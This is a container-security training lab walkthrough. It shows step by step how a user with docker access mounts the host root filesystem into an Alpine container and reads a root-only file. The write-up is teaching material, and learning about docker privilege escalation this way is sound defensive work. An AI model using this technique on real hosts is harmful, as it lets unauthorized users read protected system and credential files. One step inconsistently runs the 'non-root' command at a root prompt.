## Authentication Attacks against Host

###### A `non-root user` with access to docker can gain access to root filesystem of the host machine.

##### Step 1:

* Open Terminal

	![](img/Open-Terminal.png)

##### Step 2:

*  **cd** into  `/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host`

    ```commandline
    cd /home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host
    ```

##### Step 3:

* Run `sudo su` to become root user.

    ```commandline
      root@we45:~/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host# sudo su
      root@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host#
    ```
##### Step 4:

* Create a `secret.txt` file inside `/root/` directory.

    ```commandline
    root@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host# touch /root/secret.txt
    root@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host#
    ```
##### Step 5:

* Open `secret.txt` and write some secret in it.

    **Note:** 
    1. `esc+i` to insert character into the file,
    2. `esc+:+wq` to save and exit from the file.

    ```commandline
    root@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host# vim /root/secret.txt
    root@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host#
    ```
    
        
##### Step 6: 
  
* Run `sudo su user` login as a normal user.

    ```commandline
    root@we45:~/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host# sudo su user
    user@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host$
    ```

##### Step 7: 
  
* Run `cat /root/secret.txt` read the content of secret.txt file.

    ```commandline
    user@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host$ cat /root/secret.txt
    cat: /root/secret.txt: Permission denied
    ```

##### Step 8:

* Run `exit` to exit as a normal user

    ```commandline
    user@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host$ exit
    exit
    root@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host# 
    ```

##### Step 9: 
* Run `docker run -ti --rm -v /:/hostFS/ alpine` as `docker-user`(non-root user)

    ```commandline
    root@we45:~/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host# docker run -ti -v /:/hostFS/ alpine
    / #     
    ```
    
##### Step 10:

* Run `cd /hostFS/root/` to access the toot directory.

    ```commandline
    / # cd /hostFS/root/
    /hostFS/root # 
    ```
    
##### Step 11:  

* Run `ls` to check the secret.txt file inside a container.

    ```commandline
    /hostFS/root # ls
    secret.txt
    ``` 
    
##### Step 12:

* Run `cat secret.txt` to view the content of the file.

```commandline
/hostFS/root # cat secret.txt
secret

``` 

**Note** : Now the docker-user has the privilege to view the root user data.


##### Step 13:

* Run `exit` to exit from the container.

    ```commandline
    /hostFS/root # exit
    root@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host#
    ```

##### Step 14:

* Run `clean-docker` to stop all containers.  

    ```commandline
    (venv)root@we45:~/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host# clean-docker
    92200af86b18
    ca94dab2d52e
    92200af86b18
    34c4adcf326d
    86cd73d03ef1
    ca94dab2d52e
    "docker rmi" requires at least 1 argument.
    See 'docker rmi --help'.
    
    Usage:  docker rmi [OPTIONS] IMAGE [IMAGE...]
    
    Remove one or more images
    
    ```